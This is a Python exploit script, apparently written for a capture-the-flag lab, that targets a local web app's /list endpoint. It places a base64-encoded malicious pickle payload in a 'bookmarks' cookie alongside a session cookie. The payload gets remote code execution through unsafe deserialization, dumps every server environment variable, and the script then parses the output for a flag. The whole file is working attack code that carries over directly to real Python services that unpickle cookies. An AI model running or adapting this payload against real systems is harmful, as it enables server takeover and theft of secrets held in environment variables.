import base64
import requests
import re

# Target URL
target_url = "http://127.0.0.1:32827/list"

# Keep the existing user cookie from authentication
user_cookie = "5fb5fa20dbac4c5cacd23ae94e1b2709"

# Malicious pickle payload (base64 encoded)
# This will execute: python -c "import os; print('===ENV_VARS_START==='); [print(f'{k}={v}') for k,v in os.environ.items()]; print('===ENV_VARS_END===')"
malicious_pickle_payload = "gASVnwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjIRweXRob24gLWMgImltcG9ydCBvczsgcHJpbnQoJz09PUVOVl9WQVJTX1NUQVJUPT09Jyk7IFtwcmludChmJ3trfT17vn0nKSBmb3Igayx2IGluIG9zLmVudmlyb24uaXRlbXMoKV07IHByaW50KCc9PT1FTlZfVkFSU19FTkQ9PT0nKSKUhZRSlC4="

# Set up cookies
cookies = {
    "user": user_cookie,
    "bookmarks": malicious_pickle_payload
}

print(f"[*] Making GET request to {target_url}")
print(f"[*] Using cookies: user={user_cookie}, bookmarks=<malicious_payload>")

try:
    # Make the request
    response = requests.get(target_url, cookies=cookies, timeout=15)
    
    # Print full response information
    print(f"\n[+] Response Status: {response.status_code}")
    print(f"[+] Response Headers:")
    for header, value in response.headers.items():
        print(f"    {header}: {value}")
    
    print(f"\n[+] Response Body:")
    print(response.text)
    print("-" * 80)
    
    # Extract environment variables between markers
    print("[+] Extracting environment variables...")
    env_start = "===ENV_VARS_START==="
    env_end = "===ENV_VARS_END==="
    
    if env_start in response.text and env_end in response.text:
        start_idx = response.text.find(env_start) + len(env_start)
        end_idx = response.text.find(env_end)
        env_vars_section = response.text[start_idx:end_idx].strip()
        
        print(f"[+] Extracted environment variables:")
        print(env_vars_section)
        print("-" * 80)
        
        # Search for FLAG pattern in environment variables
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, env_vars_section)
        
        if flags:
            print(f"[!] FLAG FOUND: {flags[0]}")
        else:
            print("[-] No FLAG found in environment variables")
            # Also check full response body for FLAG
            print("[+] Checking full response body for FLAG...")
            flags_in_body = re.findall(flag_pattern, response.text)
            if flags_in_body:
                print(f"[!] FLAG FOUND IN BODY: {flags_in_body[0]}")
            else:
                print("[-] No FLAG found in full response body")
    else:
        print("[-] Environment variable markers not found in response")
        print("[-] Checking full response body for FLAG...")
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, response.text)
        if flags:
            print(f"[!] FLAG FOUND: {flags[0]}")
        else:
            print("[-] No FLAG found")
    
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e}")
except Exception as e:
    print(f"[-] Error: {e}")
